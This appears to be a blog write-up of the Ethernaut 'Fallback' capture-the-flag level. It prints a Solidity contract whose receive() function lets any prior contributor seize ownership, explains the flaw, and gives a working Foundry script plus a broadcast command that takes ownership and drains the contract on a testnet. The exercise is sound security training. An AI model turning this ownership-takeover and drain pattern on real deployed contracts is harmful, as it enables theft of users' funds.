---
title: 'Fallback - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level1.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-16
lastmod: 2025-09-16
---

## Challenge Overview

In this level, we interact with a contract called **Fallback**.  
The goal is to:

1. Become the owner of the contract.  
2. Drain all its funds.  

At first glance, ownership seems restricted to whoever deploys the contract. However, the `receive()` function hides a critical vulnerability.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
````

---

## Exploit Explanation

The vulnerability lies in the `receive()` function:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

* To trigger it, we must **already have a contribution > 0**.
* Once this condition is met, sending Ether directly to the contract calls `receive()` and **updates the owner to our address**.

So the exploit sequence is:

1. Call `contribute()` with a tiny amount (`< 0.001 ether`) to register a contribution.
2. Send Ether directly to the contract → this calls `receive()` and transfers ownership to us.
3. Call `withdraw()` → since we’re now the owner, we can drain the contract’s balance.

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Fallback.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(<YOUR_INSTANCE>));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Step 1: Contribute a small amount
        fallbackInstance.contribute{value: 1 wei}();

        // Step 2: Send ether directly -> triggers receive()
        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Fallback call failed");

        // Debug logs
        console.log("New Owner:", fallbackInstance.owner());
        console.log("My Address:", vm.envAddress("MY_ADDRESS"));

        // Step 3: Withdraw funds
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Run the exploit with Foundry:

```bash
forge script script/FallbackSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```
